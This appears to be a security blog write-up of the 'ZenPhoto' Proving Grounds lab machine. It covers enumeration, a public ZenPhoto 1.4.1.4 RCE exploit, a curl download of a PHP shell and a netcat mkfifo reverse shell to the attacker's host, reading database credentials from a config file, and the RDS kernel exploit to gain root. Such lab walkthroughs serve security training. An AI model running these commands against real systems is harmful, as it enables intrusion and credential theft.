@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="ZenPhoto - PG" /><meta name="author" content="0xKirito" /><meta property="og:locale" content="en" /><meta name="description" content="Recon &amp; Enumeration" /><meta property="og:description" content="Recon &amp; Enumeration" /><link rel="canonical" href="https://0xkirito.github.io/posts/PG-ZenPhoto/" /><meta property="og:url" content="https://0xkirito.github.io/posts/PG-ZenPhoto/" /><meta property="og:site_name" content="0xKirito’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-15T17:32:44+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="ZenPhoto - PG" /><meta name="twitter:site" content="@0xKirito" /><meta name="twitter:creator" content="@0xKirito" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0xKirito"},"dateModified":"2022-01-15T17:32:44+00:00","datePublished":"2022-01-15T17:32:44+00:00","description":"Recon &amp; Enumeration","headline":"ZenPhoto - PG","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xkirito.github.io/posts/PG-ZenPhoto/"},"url":"https://0xkirito.github.io/posts/PG-ZenPhoto/"}</script><title>ZenPhoto - PG | 0xKirito's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xKirito's Blog"><meta name="application-name" content="0xKirito's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600;700;900&family=Fira+Sans:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/kirito.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xKirito's Blog</a></div><div class="site-subtitle font-italic">Cyber Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xKirito" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xKirito" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xKirito','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>ZenPhoto - PG</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>ZenPhoto - PG</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/0xKirito">0xKirito</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1642267964" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-01-15 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="720 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><h2 id="recon--enumeration"><span class="mr-2">Recon &amp; Enumeration</span><a href="#recon--enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre># autorecon
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.123.41
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
+|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
+23/tcp   open  ipp     CUPS 1.4
+|_http-server-header: CUPS/1.4
+| http-methods: 
+|   Supported Methods: GET HEAD OPTIONS POST PUT
+|_  Potentially risky methods: PUT
+|_http-title: 403 Forbidden
+80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+3306/tcp open  mysql   MySQL (unauthorized)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2.0 (95%), Linux 2.6.32 (93%), Linux 2.6.35 (93%)
+</pre></table></code></div></div><h3 id="ffuf"><span class="mr-2">Ffuf</span><a href="#ffuf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>ffuf -u http://192.168.123.41/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -t 40 
+
+test  [Status: 301, Size: 315, Words: 20, Lines: 10]
+</pre></table></code></div></div><ul><li>http://192.168.123.41/test/<li>Powered by zenPHOTO<li>Google: zenphoto<li>https://github.com/zenphoto/zenphoto<li>This gives us the directory structure so now we can go through files and check for any files with sensitive information, version number, etc to aid in further enumeration<li>If we view the source for <code class="language-plaintext highlighter-rouge">http://192.168.123.41/test/</code> and search for version or scroll to the bottom, we see version number mentioned there</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>&lt;!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  --&gt;
+</pre></table></code></div></div><ul><li>http://192.168.123.41/test/robots.txt</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>Disallow: /test/albums/
+Disallow: /test/cache/
+Disallow: /test/themes/
+Disallow: /test/zp-core/
+Disallow: /test/zp-data/
+Disallow: /test/page/search/
+Disallow: /test/uploaded/
+</pre></table></code></div></div><hr /><h2 id="exploitation"><span class="mr-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><code class="language-plaintext highlighter-rouge">searchsploit zenphoto</code><li><a href="https://www.exploit-db.com/exploits/18083">ZenPhoto 1.4.1.4 - ‘ajax_create_folder.php’ Remote Code Execution</a><li><code class="language-plaintext highlighter-rouge">php 18083.php 192.168.123.41 /test/</code><li><code class="language-plaintext highlighter-rouge">whoami =&gt; www-data</code><li><code class="language-plaintext highlighter-rouge">curl 192.168.49.123/shell.php -o /var/www/test/shell.php</code><li>We do not have write access to the web root directory<li>This shell was very restricted so I got another proper reverse shell with netcat<li><code class="language-plaintext highlighter-rouge">nc -lvnp 23</code> - since port 23 was also open on the target<li>Then run the following reverse shell one liner from the PHP shell we have:</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.49.123 23 &gt;/tmp/f
+</pre></table></code></div></div><hr /><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>There is MySQL running on this machine as we know from our nmap scan so I started looking for files with MySQL credentials<li><code class="language-plaintext highlighter-rouge">cat /var/www/test/zp-data/zp-config.php</code></ul><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="c1"># zp-data/zp-config.php</span>
+<span class="nv">$conf</span><span class="p">[</span><span class="s1">'mysql_user'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
+<span class="nv">$conf</span><span class="p">[</span><span class="s1">'mysql_pass'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'hola'</span><span class="p">;</span>
+<span class="nv">$conf</span><span class="p">[</span><span class="s1">'mysql_host'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+<span class="nv">$conf</span><span class="p">[</span><span class="s1">'mysql_database'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'zenphoto'</span><span class="p">;</span>
+</pre></table></code></div></div><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">id</span><span class="p">,</span> <span class="k">user</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">pass</span> <span class="k">from</span> <span class="n">zp_administrators</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----+----------------+----------+------------------------------------------+</span>
+<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="k">user</span>           <span class="o">|</span> <span class="n">name</span>     <span class="o">|</span> <span class="n">pass</span>                                     <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------------+----------+------------------------------------------+</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="n">administrators</span> <span class="o">|</span> <span class="k">group</span>    <span class="o">|</span> <span class="k">NULL</span>                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">2</span> <span class="o">|</span> <span class="n">viewers</span>        <span class="o">|</span> <span class="k">group</span>    <span class="o">|</span> <span class="k">NULL</span>                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">3</span> <span class="o">|</span> <span class="n">bozos</span>          <span class="o">|</span> <span class="k">group</span>    <span class="o">|</span> <span class="k">NULL</span>                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">4</span> <span class="o">|</span> <span class="n">album</span> <span class="n">managers</span> <span class="o">|</span> <span class="k">template</span> <span class="o">|</span> <span class="k">NULL</span>                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">5</span> <span class="o">|</span> <span class="k">default</span>        <span class="o">|</span> <span class="k">template</span> <span class="o">|</span> <span class="k">NULL</span>                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">6</span> <span class="o">|</span> <span class="n">newuser</span>        <span class="o">|</span> <span class="k">template</span> <span class="o">|</span> <span class="k">NULL</span>                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">7</span> <span class="o">|</span> <span class="k">admin</span>          <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="mi">63</span><span class="n">e5c2e178e611b692b526f8b6332317f2ff5513</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+----------------+----------+------------------------------------------+</span>
+</pre></table></code></div></div><ul><li>Could not crack that hash so moved on to kernel exploits since this kernel version is really old<li><code class="language-plaintext highlighter-rouge">uname -a =&gt; Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux</code><li>LinPEAS suggested RDS kernel exploit and dirtycow<li>Reliable Datagram Sockets (RDS) Linux Privilege Escalation (Linux Kernel 2.6.30 &lt; 2.6.36-rc8)</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>Possible Exploits:
+[+] [CVE-2010-3904] rds
+   Details: http://www.securityfocus.com/archive/1/514379
+   Exposure: highly probable
+   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
+   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">wget 192.168.49.123/linux-rds-exploit.c -P /dev/shm/</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>www-data@offsecsrv:/dev/shm$ gcc linux-rds-exploit.c -o rds-exploit
+www-data@offsecsrv:/dev/shm$ chmod +x rds-exploit
+www-data@offsecsrv:/dev/shm$ ./rds-exploit
+[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved rds_proto_ops to 0xf821d980
+ [+] Resolved rds_ioctl to 0xf8217090
+ [+] Resolved commit_creds to 0xc016dcc0
+ [+] Resolved prepare_kernel_cred to 0xc016e000
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+[*] Got root!
+# whoami
+root
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>root@offsecsrv:/root# 
+whoami &amp;&amp; hostname &amp;&amp; ifconfig | grep inet &amp;&amp; cat proof.txt
+
+root
+offsecsrv
+    inet addr:192.168.123.41  Bcast:192.168.123.255  Mask:255.255.255.0
+    inet6 addr: fe80::250:56ff:feba:b881/64 Scope:Link
+    inet addr:127.0.0.1  Mask:255.0.0.0
+    inet6 addr: ::1/128 Scope:Host
+4444cb0a0a33ab90abc85d121d2554
+</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a>, <a href='/categories/proving-grounds/'>Proving Grounds</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pg/" class="post-tag no-text-decoration" >PG</a> <a href="/tags/zenphoto/" class="post-tag no-text-decoration" >ZenPhoto</a> <a href="/tags/rds/" class="post-tag no-text-decoration" >RDS</a> <a href="/tags/kernel-exploit/" class="post-tag no-text-decoration" >Kernel Exploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=ZenPhoto+-+PG+-+0xKirito%27s+Blog&url=https%3A%2F%2F0xkirito.github.io%2Fposts%2FPG-ZenPhoto%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=ZenPhoto+-+PG+-+0xKirito%27s+Blog&u=https%3A%2F%2F0xkirito.github.io%2Fposts%2FPG-ZenPhoto%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2F0xkirito.github.io%2Fposts%2FPG-ZenPhoto%2F&text=ZenPhoto+-+PG+-+0xKirito%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Beep/">Beep - HTB</a><li><a href="/posts/VulnHub-Symfonos5/">Symfonos 5 - VulnHub</a><li><a href="/posts/HTB-Knife/">Knife - HTB</a><li><a href="/posts/HTB-Armageddon/">Armageddon - HTB</a><li><a href="/posts/THM-Kenobi/">Kenobi - THM</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/pg/">PG</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/maldocs/">Maldocs</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/mysql/">MySQL</a> <a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/vulnhub/">VulnHub</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/PG-Slort/"><div class="card-body"> <em class="timeago small" data-ts="1641167910" > 2022-01-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Slort - PG</h3><div class="text-muted small"><p> Recon &amp;amp; Enumeration nmap -Pn -p- -A 192.168.174.53 PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd 0.9.41 beta | ftp-syst: |_ SYST: UNIX emulated by F...</p></div></div></a></div><div class="card"> <a href="/posts/PG-XposedAPI/"><div class="card-body"> <em class="timeago small" data-ts="1642297030" > 2022-01-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>XposedAPI - PG</h3><div class="text-muted small"><p> Recon &amp;amp; Enumeration 1 2 # autorecon nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.123.134 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PORT ...</p></div></div></a></div><div class="card"> <a href="/posts/PG-Vector/"><div class="card-body"> <em class="timeago small" data-ts="1642826594" > 2022-01-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vector - PG</h3><div class="text-muted small"><p> Recon &amp;amp; Enumeration 1 2 # autorecon nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.157.119 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 1...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/PG-Slort/" class="btn btn-outline-primary" prompt="Older"><p>Slort - PG</p></a> <a href="/posts/PG-XposedAPI/" class="btn btn-outline-primary" prompt="Newer"><p>XposedAPI - PG</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/0xKirito">0xKirito</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/pg/">PG</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/maldocs/">Maldocs</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/mysql/">MySQL</a> <a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/vulnhub/">VulnHub</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
